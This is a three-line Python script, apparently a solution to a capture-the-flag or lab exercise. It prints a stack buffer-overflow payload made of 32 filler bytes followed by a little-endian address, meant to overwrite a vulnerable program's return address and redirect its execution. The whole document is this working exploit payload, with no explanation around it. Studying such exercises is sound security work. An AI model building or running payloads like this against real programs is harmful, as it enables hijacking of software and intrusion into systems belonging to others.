import sys
payload = payload = b'a'*32 + b'\x8b\x84\x04\x08'
sys.stdout.buffer.write(payload)
